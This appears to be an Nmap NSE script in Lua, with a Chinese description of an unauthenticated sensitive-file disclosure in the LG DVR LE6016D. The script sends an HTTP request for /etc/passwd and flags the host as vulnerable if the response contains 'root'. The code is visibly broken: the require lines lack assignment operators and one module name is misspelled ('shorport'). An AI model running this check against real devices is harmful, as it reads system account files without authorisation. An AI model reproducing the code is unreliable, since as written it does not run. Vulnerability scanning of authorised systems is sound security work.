local http require "http"
local string require "string"
local stdnse require "stdnse"
local shortport require "shorport"


description = [[
Desc:LG DVR LE6016D存在敏感信息泄露漏洞，
未认证用户只需要发起一个请求链接即可访问系统敏感文件，
如/etc/passwd, /etc/shadow
Tested:LG DVR LE6016D
]]


author = "seaung"


portrule = shortport.http

action = function(host, port)
    local output = stdnse.output_table()
    local url = "/etc/passwd"
    local response = http.get(host, port, url)

    if response.status == 200 then
        if string.find(response.body, "root") ~= nil then
            output = "[+] Found vulnerable."
        else
            output = "[-] Not Found vulnerable."
        end
    end
    return output
end

